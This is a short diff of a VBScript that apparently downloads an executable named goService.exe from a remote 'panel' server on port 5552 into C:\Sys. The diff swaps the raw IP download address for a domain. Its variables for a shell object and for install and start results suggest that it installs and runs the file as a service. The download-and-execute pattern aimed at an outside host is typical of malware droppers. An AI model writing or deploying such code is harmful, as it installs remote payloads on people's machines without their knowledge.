@@ -8,7 +8,7 @@ End If
 Dim url, downloadPath, objXMLHTTP, objStream, objShell, objFSO, objFile, installResult, startResult
 Dim commandOutput, errorFile
 
-url = "http://51.81.73.108:5552/uploads/goService.exe"
+url = "http://panel.ryugi.be:5552/uploads/goService.exe"
 downloadPath = "C:\Sys\goService.exe"
 errorFile = "C:\Sys\service_install_log.txt"
 
